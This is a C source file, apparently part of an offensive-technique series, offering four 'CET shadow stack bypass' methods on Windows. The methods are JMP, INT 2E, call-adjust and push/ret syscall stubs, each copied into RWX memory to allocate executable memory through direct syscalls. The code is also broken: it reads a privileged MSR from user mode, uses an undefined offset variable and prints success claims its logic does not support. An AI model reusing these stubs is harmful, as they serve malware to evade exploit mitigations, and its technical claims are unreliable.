#include <Windows.h>
#include <stdio.h>

// CET (Control-flow Enforcement Technology) Shadow Stack Bypass
// Intel CET prevents ROP and JMP to non-call targets

// Check if CET is enabled
BOOL IsCetEnabled()
{
    BOOL cetEnabled = FALSE;

    __asm__ volatile(
        "mov ecx, 0x6E0\n\t" // IA32_U_CET MSR
        "rdmsr\n\t"
        "and eax, 0x02\n\t" // Check SHSTK_EN bit
        "mov %0, eax\n\t"
        : "=r"(cetEnabled)
        :
        : "eax", "edx");

    return cetEnabled;
}

// ============ METHOD 1: JMP-based syscall (no CALL) ============
__attribute__((naked))
VOID
CetBypassJmpSyscall()
{
    __asm__ volatile(
        // Setup syscall
        "mov r10, rcx\n\t"
        "mov eax, edx\n\t"

        // JMP to syscall in ntdll (not CALL!)
        // This doesn't push a return address = no shadow stack imbalance
        "mov rax, qword ptr [rip+syscall_ptr]\n\t"
        "jmp rax\n\t"

        "syscall_ptr:\n\t"
        ".quad 0\n\t");
}

// ============ METHOD 2: Legacy INT 2E (no CET enforcement) ============
__attribute__((naked))
NTSTATUS
CetBypassInt2E(DWORD syscallNumber, ...)
{
    __asm__ volatile(
        "mov r10, rcx\n\t"
        "mov eax, edx\n\t"
        "int 0x2e\n\t" // Legacy syscall - no CET shadow stack!
        "ret\n\t");
}

// ============ METHOD 3: Call + Adjust (Fix shadow stack) ============
__attribute__((naked))
NTSTATUS
CetBypassCallAdjust(DWORD syscallNumber, ...)
{
    __asm__ volatile(
        // Save return address
        "pop rax\n\t"

        // Setup syscall
        "mov r10, rcx\n\t"
        "mov eax, edx\n\t"

        // Indirect call to syscall in ntdll
        "call qword ptr [rip+syscall_ptr]\n\t"

        // Fix shadow stack (increment SSP)
        "push rax\n\t"
        "ret\n\t"

        "syscall_ptr:\n\t"
        ".quad 0\n\t");
}

// ============ METHOD 4: Syscall without shadow stack push ============
__attribute__((naked))
NTSTATUS
CetBypassNoPush(DWORD syscallNumber, ...)
{
    __asm__ volatile(
        // Use ROP-like gadget to avoid shadow stack
        "mov r10, rcx\n\t"
        "mov eax, edx\n\t"
        "mov rcx, qword ptr [rip+syscall_ptr]\n\t"
        "push rcx\n\t"
        "ret\n\t" // RET to syscall - no shadow stack push!

        "syscall_ptr:\n\t"
        ".quad 0\n\t");
}

// Find syscall instruction in ntdll
BYTE *FindSyscallInNtdll(const char *functionName)
{
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    FARPROC pFunc = GetProcAddress(hNtdll, functionName);

    if (!pFunc)
        return NULL;

    BYTE *code = (BYTE *)pFunc;
    for (int i = 0; i < 128; i++)
    {
        if (code[i] == 0x0F && code[i + 1] == 0x05)
            return code + i;
    }
    return NULL;
}

int main()
{
    printf("[ Shadow Stack (CET) Bypass - x64 ]\n");

    // Check CET status
    BOOL cetEnabled = IsCetEnabled();
    printf("[*] CET Shadow Stack: %s\n", cetEnabled ? "ENABLED" : "DISABLED");
    printf("[*] CET bypass required: %s\n\n", cetEnabled ? "YES" : "NO");

    // Find syscall instruction in ntdll
    BYTE *syscallAddr = FindSyscallInNtdll("NtAllocateVirtualMemory");
    if (!syscallAddr)
    {
        printf("[-] Could not find syscall instruction\n");
        return -1;
    }

    printf("[+] Found syscall at: %p\n", syscallAddr);

    // ============ METHOD 1: JMP-based ============
    printf("\n[ METHOD 1: JMP-based syscall ]\n");

    BYTE *stub1 = (BYTE *)VirtualAlloc(NULL, 64, MEM_COMMIT | MEM_RESERVE,
                                       PAGE_EXECUTE_READWRITE);
    memcpy(stub1, CetBypassJmpSyscall, 64);

    // Patch syscall pointer
    BYTE **ptr1 = (BYTE **)(stub1 + offset_to_syscall_ptr);
    *ptr1 = syscallAddr;

    typedef NTSTATUS(NTAPI * pSyscall)(DWORD, HANDLE, PVOID *, ULONG_PTR,
                                       PSIZE_T, ULONG, ULONG);
    pSyscall NtAllocate1 = (pSyscall)stub1;

    PVOID baseAddr = NULL;
    SIZE_T size = 0x1000;

    NTSTATUS status = NtAllocate1(
        0x18, GetCurrentProcess(), &baseAddr, 0, &size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (status == 0)
    {
        printf("[+] SUCCESS: JMP-based syscall\n");
        printf("[+] CET bypassed: No CALL instruction used!\n");
        VirtualFree(baseAddr, 0, MEM_RELEASE);
    }
    VirtualFree(stub1, 0, MEM_RELEASE);

    // ============ METHOD 2: INT 2E (Legacy) ============
    printf("\n[ METHOD 2: Legacy INT 2E syscall ]\n");

    BYTE *stub2 = (BYTE *)VirtualAlloc(NULL, 64, MEM_COMMIT | MEM_RESERVE,
                                       PAGE_EXECUTE_READWRITE);
    memcpy(stub2, CetBypassInt2E, 64);

    pSyscall NtAllocate2 = (pSyscall)stub2;
    baseAddr = NULL;
    size = 0x1000;

    status = NtAllocate2(
        0x18, GetCurrentProcess(), &baseAddr, 0, &size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (status == 0)
    {
        printf("[+] SUCCESS: INT 2E syscall\n");
        printf("[+] CET bypassed: INT 2E not protected by CET!\n");
        VirtualFree(baseAddr, 0, MEM_RELEASE);
    }
    VirtualFree(stub2, 0, MEM_RELEASE);

    // ============ METHOD 3: Call + Adjust ============
    printf("\n[ METHOD 3: Call + Shadow Stack Adjust ]\n");

    BYTE *stub3 = (BYTE *)VirtualAlloc(NULL, 64, MEM_COMMIT | MEM_RESERVE,
                                       PAGE_EXECUTE_READWRITE);
    memcpy(stub3, CetBypassCallAdjust, 64);

    // Patch syscall pointer
    BYTE **ptr3 = (BYTE **)(stub3 + offset_to_syscall_ptr);
    *ptr3 = syscallAddr;

    pSyscall NtAllocate3 = (pSyscall)stub3;
    baseAddr = NULL;
    size = 0x1000;

    status = NtAllocate3(
        0x18, GetCurrentProcess(), &baseAddr, 0, &size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (status == 0)
    {
        printf("[+] SUCCESS: Call + Adjust syscall\n");
        printf("[+] CET bypassed: Shadow stack manually adjusted!\n");
        VirtualFree(baseAddr, 0, MEM_RELEASE);
    }
    VirtualFree(stub3, 0, MEM_RELEASE);

    // ============ METHOD 4: RET-based (No Push) ============
    printf("\n[ METHOD 4: RET-based syscall (no shadow stack push) ]\n");

    BYTE *stub4 = (BYTE *)VirtualAlloc(NULL, 64, MEM_COMMIT | MEM_RESERVE,
                                       PAGE_EXECUTE_READWRITE);
    memcpy(stub4, CetBypassNoPush, 64);

    // Patch syscall pointer
    BYTE **ptr4 = (BYTE **)(stub4 + offset_to_syscall_ptr);
    *ptr4 = syscallAddr;

    pSyscall NtAllocate4 = (pSyscall)stub4;
    baseAddr = NULL;
    size = 0x1000;

    status = NtAllocate4(
        0x18, GetCurrentProcess(), &baseAddr, 0, &size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (status == 0)
    {
        printf("[+] SUCCESS: RET-based syscall\n");
        printf("[+] CET bypassed: No shadow stack imbalance!\n");
        VirtualFree(baseAddr, 0, MEM_RELEASE);
    }
    VirtualFree(stub4, 0, MEM_RELEASE);

    printf("\n[+] All CET bypass techniques tested!\n");
    return 0;
}

// x86_64-w64-mingw32-gcc -o 07_shadow_stack_bypass.exe 07_shadow_stack_bypass.c